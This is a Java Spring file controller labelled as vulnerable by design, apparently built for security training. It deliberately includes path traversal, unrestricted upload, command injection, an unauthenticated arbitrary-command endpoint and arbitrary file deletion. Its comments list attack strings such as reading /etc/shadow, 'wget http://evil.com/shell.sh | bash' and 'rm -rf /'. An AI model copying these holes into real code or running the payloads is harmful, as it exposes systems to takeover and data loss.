package com.death.cocktail.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.*;
import java.nio.file.*;
import java.util.*;

/**
 * ⚠️ VULNERABLE BY DESIGN - DO NOT USE IN PRODUCTION ⚠️
 *
 * File Controller with INTENTIONAL vulnerabilities:
 * - Path Traversal (CWE-22)
 * - Command Injection (CWE-78)
 * - Arbitrary File Upload (CWE-434)
 * - Remote Code Execution
 */
@RestController
@RequestMapping("/api/files")
public class FileController {

    private static final Logger logger = LogManager.getLogger(FileController.class);
    private static final String UPLOAD_DIR = "/tmp/uploads/";

    @GetMapping("/read")
    public Map<String, Object> readFile(@RequestParam String filename) {
        // VULNERABILITY: Log4Shell
        logger.info("Reading file: " + filename);

        Map<String, Object> response = new HashMap<>();

        // ============================================================
        // VULNERABILITY: Path Traversal (CWE-22)
        // ============================================================
        // No validation of filename - attacker can use ../
        // Attack: filename=../../../etc/passwd
        // Attack: filename=....//....//....//etc/passwd (bypass attempt)
        // ============================================================
        try {
            String content = new String(Files.readAllBytes(Paths.get(UPLOAD_DIR + filename)));
            response.put("success", true);
            response.put("content", content);
            response.put("path", UPLOAD_DIR + filename); // Exposes full path
        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @PostMapping("/upload")
    public Map<String, Object> uploadFile(@RequestParam("file") MultipartFile file) {
        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Log4Shell via filename
        logger.info("Uploading file: " + file.getOriginalFilename());

        // ============================================================
        // VULNERABILITY: Arbitrary File Upload (CWE-434)
        // ============================================================
        // - No file type validation
        // - No file size limit
        // - Executable files allowed (.jsp, .php, .sh)
        // - Original filename preserved (path traversal possible)
        // ============================================================

        String originalFilename = file.getOriginalFilename();

        // VULNERABILITY: Path traversal in filename
        // Attacker can upload as: "../../../var/www/html/shell.jsp"
        try {
            Path targetPath = Paths.get(UPLOAD_DIR + originalFilename);
            Files.createDirectories(targetPath.getParent());
            Files.write(targetPath, file.getBytes());

            response.put("success", true);
            response.put("filename", originalFilename);
            response.put("path", targetPath.toString());
            response.put("size", file.getSize());

            // VULNERABILITY: If .sh file, make it executable!
            if (originalFilename.endsWith(".sh")) {
                targetPath.toFile().setExecutable(true);
                response.put("executable", true);
            }
        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @GetMapping("/download")
    public byte[] downloadFile(@RequestParam String path) throws IOException {
        // VULNERABILITY: Log4Shell
        logger.info("Downloading: " + path);

        // VULNERABILITY: Arbitrary File Read via Path Traversal
        // No validation - can read any file on system
        // Attack: path=/etc/shadow
        return Files.readAllBytes(Paths.get(path));
    }

    @PostMapping("/process")
    public Map<String, Object> processFile(@RequestParam String filename,
                                           @RequestParam String operation) {
        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Log4Shell
        logger.info("Processing " + filename + " with operation: " + operation);

        // ============================================================
        // VULNERABILITY: Command Injection (CWE-78) - CRITICAL
        // ============================================================
        // User input directly concatenated into shell command
        // Attack: filename=test.txt; cat /etc/passwd
        // Attack: filename=test.txt && wget http://evil.com/shell.sh | bash
        // Attack: operation=cat; rm -rf /
        // ============================================================

        String command = "";
        try {
            switch (operation) {
                case "count":
                    command = "wc -l " + UPLOAD_DIR + filename;
                    break;
                case "head":
                    command = "head -10 " + UPLOAD_DIR + filename;
                    break;
                case "grep":
                    command = "grep -i error " + UPLOAD_DIR + filename;
                    break;
                default:
                    // VULNERABILITY: Direct command execution!
                    command = operation + " " + UPLOAD_DIR + filename;
            }

            // VULNERABILITY: Runtime.exec() with user input
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );

            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            response.put("success", true);
            response.put("command", command); // Exposes command
            response.put("output", output.toString());

        } catch (Exception e) {
            response.put("success", false);
            response.put("command", command);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @PostMapping("/execute")
    public Map<String, Object> executeCommand(@RequestBody Map<String, String> request) {
        String cmd = request.get("command");
        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Log4Shell
        logger.info("Executing command: " + cmd);

        // ============================================================
        // VULNERABILITY: Direct Remote Code Execution (CWE-78)
        // ============================================================
        // This endpoint literally executes any command!
        // No authentication, no validation, no restrictions
        // ============================================================

        try {
            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            BufferedReader errorReader = new BufferedReader(
                new InputStreamReader(process.getErrorStream())
            );

            StringBuilder output = new StringBuilder();
            StringBuilder errors = new StringBuilder();
            String line;

            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            while ((line = errorReader.readLine()) != null) {
                errors.append(line).append("\n");
            }

            int exitCode = process.waitFor();

            response.put("success", exitCode == 0);
            response.put("output", output.toString());
            response.put("errors", errors.toString());
            response.put("exitCode", exitCode);

        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @GetMapping("/list")
    public Map<String, Object> listFiles(@RequestParam(defaultValue = ".") String directory) {
        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Log4Shell
        logger.info("Listing directory: " + directory);

        // VULNERABILITY: Directory Traversal
        // Attack: directory=../../../
        try {
            File dir = new File(UPLOAD_DIR + directory);
            String[] files = dir.list();
            response.put("success", true);
            response.put("path", dir.getAbsolutePath());
            response.put("files", files);
        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @DeleteMapping("/delete")
    public Map<String, Object> deleteFile(@RequestParam String path) {
        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Log4Shell
        logger.info("Deleting: " + path);

        // VULNERABILITY: Arbitrary File Deletion
        // Attack: path=../../../important/data
        try {
            Files.delete(Paths.get(UPLOAD_DIR + path));
            response.put("success", true);
            response.put("deleted", path);
        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }
}
